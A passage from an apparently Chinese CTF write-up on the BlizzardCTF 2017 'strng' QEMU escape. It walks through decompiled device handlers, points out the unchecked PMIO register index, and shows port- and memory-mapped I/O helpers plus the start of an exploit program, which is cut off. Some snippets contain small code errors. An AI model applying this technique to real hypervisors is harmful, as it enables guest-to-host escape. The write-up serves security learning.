</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>vala</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-30h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>addr</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>addr</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=p>,</span> <span class=n>hwaddr</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand</span><span class=p>)(</span><span class=n>opaque</span><span class=p>,</span> <span class=n>idx</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span> <span class=o>&lt;</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=nf>srand</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>vala</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=nf>rand_r</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nf>LODWORD</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>=</span> <span class=n>vala</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>idx=0时，调用<code>srand(val)</code>设置随机种子</p><p>idx=1时，调用<code>rand()</code>设置随机值到regs[1]</p><p>idx>=3时，将val设置到regs[idx]</p><p>看起来idx没有限制，但是PCI设备会进行内部的检查，因为PCI注册的MMIO空间大小只有256字节。</p><h4 id=编程进行mmio>编程进行MMIO<a hidden class=anchor aria-hidden=true href=#编程进行mmio>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>mmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>mmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span><span class=o>*</span><span class=p>)</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>mmio_fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/sys/devices/pci0000:00/0000:00:03.0/resource0&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_SYNC</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;open mmio_fd failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>mmio_mem</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>mmio_fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>mmio_mem</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;mmap mmio_mem failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=pmio>PMIO<a hidden class=anchor aria-hidden=true href=#pmio>#</a></h3><h4 id=strng_pmio_read>strng_pmio_read<a hidden class=anchor aria-hidden=true href=#strng_pmio_read>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>strng_pmio_read</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// edx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>v4</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>v4</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>result</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里也可以发现，这些函数中的addr，都是起始端口/地址的偏移。</p><p>如果操作号(addr)是0，则读取存储的地址；</p><p>如果操作号是4，则读取地址处的值(regs[addr&#187;2])。</p><h4 id=strng_pmio_write>strng_pmio_write<a hidden class=anchor aria-hidden=true href=#strng_pmio_write>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>strng_pmio_write</span><span class=p>(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint32_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>v4</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>idx</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>STRNGState</span> <span class=o>*</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand</span><span class=p>)(</span><span class=n>opaque</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>,</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>idx</span> <span class=o>&lt;</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=nf>srand</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>idx</span> <span class=o>==</span> <span class=mi>3</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>((</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kt>uint64_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>rand_r</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>                                <span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                                <span class=mi>4LL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>else</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>regs</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>操作号为0，则设置地址addr；</p><p>操作号为4，则写入数据。</p><ul><li><p>idx=0，srand设置种子</p></li><li><p>idx=1，regs[1]=rand()</p></li><li><p>idx=3，regs[3]=rand_r(&amp;opaque->regs[2])</p></li><li><p>idx>3，regs[idx]=val</p></li></ul><p>这里看起来有机可乘，没有对PMIO的addr进行检查。</p><h4 id=编程进行pmio>编程进行PMIO<a hidden class=anchor aria-hidden=true href=#编程进行pmio>#</a></h4><p>使用&lt;sys/io.h>中的outb/inb，outw/inw，outl/inl函数。</p><p>访问相应的端口需要一定的权限，程序应使用root权限执行。对于0x000-0x3ff之间的端口，使用<code>ioperm(from, num turn_on)</code>即可；对于0x3ff以上的端口，应调用<code>iopl(3)</code>去获取权限。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>pmio_base</span> <span class=o>=</span> <span class=mh>0xc050</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>outl</span><span class=p>(</span><span class=n>value</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=nf>inl</span><span class=p>(</span><span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>iopl</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>die</span><span class=p>(</span><span class=s>&#34;iopl failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_write</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>pmio_read</span><span class=p>(</span><span class=n>pmio_base</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=利用>利用<a hidden class=anchor aria-hidden=true href=#利用>#</a></h3><p><a href=https://github.com/clxsh/ctf_wps/tree/master/others/qemu_pwn/BlizzardCTF2017_strng>exp和脚本</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/io.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define MAP_SIZE 4096
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>pmio_base</span> <span class=o>=</span> <span class=mh>0xc050</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>mmio_path</span> <span class=o>=</span> <span class=s>&#34;/sys/devices/pci0000:00/0000:00:03.0/resource0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>mmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>mmio_write</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>mmio_mem</span> <span class=o>+</span> <span class=n>addr</span><span class=p>))</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=nf>pmio_read</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
